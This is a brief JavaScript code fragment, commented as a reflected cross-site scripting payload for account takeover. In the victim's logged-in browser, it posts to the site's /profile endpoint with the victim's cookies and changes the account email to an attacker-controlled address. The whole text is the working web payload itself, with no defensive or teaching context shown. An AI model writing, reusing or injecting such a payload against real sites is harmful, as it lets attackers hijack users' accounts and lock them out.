   // Reflected XSS payload — account takeover.
   // Runs in the logged-in victim's browser and changes their email
   // to the attacker's, using the victim's own session cookie.
   fetch("/profile", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: "email=pwned-by-xss@evil.com",
     credentials: "include"
   });
